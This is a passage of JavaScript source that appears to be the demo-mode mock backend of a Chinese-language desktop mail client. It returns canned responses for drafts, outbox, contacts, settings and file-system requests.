      const index = drafts.findIndex((item) => item.id === Number(params.id))
      if (index >= 0) drafts.splice(index, 1)
      return Promise.resolve({ ok: true })
    }
    case 'outbox/list':
      return Promise.resolve({ items: outbox })
    case 'outbox/cancel': {
      const item = outbox.find((entry) => entry.id === Number(params.id))
      if (!item) return Promise.reject(new Error('邮件不存在'))
      if (item.status === 'sent') return Promise.reject(new Error('邮件已经发出，无法撤销'))
      item.status = 'canceled'
      return Promise.resolve({ canceled: true })
    }
    case 'outbox/retry': {
      const item = outbox.find((entry) => entry.id === Number(params.id))
      if (item) {
        item.status = 'queued'
        item.error = ''
        item.scheduledAt = Date.now()
      }
      return Promise.resolve({ ok: true })
    }
    case 'outbox/delete': {
      const index = outbox.findIndex((entry) => entry.id === Number(params.id))
      if (index >= 0) outbox.splice(index, 1)
      return Promise.resolve({ ok: true })
    }
    case 'contacts/list':
      return Promise.resolve({ items: contacts })
    case 'settings/get':
      return Promise.resolve({ settings })
    case 'settings/set':
      Object.assign(settings, params.settings ?? params)
      return Promise.resolve({ settings })
    case 'fs/dirs':
      return Promise.resolve({
        path: String(params.path ?? 'C:\\Users\\demo'),
        parent: 'C:\\Users',
        entries: demoDirs.slice(0, 3),
        roots: [{ name: 'C:\\', path: 'C:\\' }],
        shortcuts: demoDirs,
        writable: true,
      })
    case 'fs/files':
      return Promise.resolve({
        items: [
          { name: '报价单.xlsx', path: 'C:\\Users\\demo\\Documents\\报价单.xlsx', size: 240_000, mtime: now },
          { name: 'logo.png', path: 'C:\\Users\\demo\\Documents\\logo.png', size: 84_000, mtime: now },
          { name: '会议纪要.pdf', path: 'C:\\Users\\demo\\Documents\\会议纪要.pdf', size: 520_000, mtime: now },
        ],
      })
    case 'fs/readFile':
      return Promise.resolve({
        name: 'logo.png',
        path: String(params.path ?? ''),
        mime: 'image/png',
        size: 84_000,
        dataBase64: '',
      })
    case 'fs/saveUpload':
      return Promise.resolve({
        name: String(params.name ?? 'file.bin'),
        path: `C:\\Users\\demo\\AppData\\Roaming\\dbx-mail\\tmp\\${String(params.name ?? 'file.bin')}`,
        mime: 'application/octet-stream',
        size: 1024,
      })
    case 'fs/defaultDir':
      return Promise.resolve({ path: 'C:\\Users\\demo\\Downloads\\DBX 邮件' })
    case 'fs/saveAttachment':
      return Promise.resolve({ path: 'C:\\Users\\demo\\Downloads\\DBX 邮件\\tickets.pdf' })
    default:
      return Promise.reject(new Error(`演示模式未实现：${method}`))
  }
}
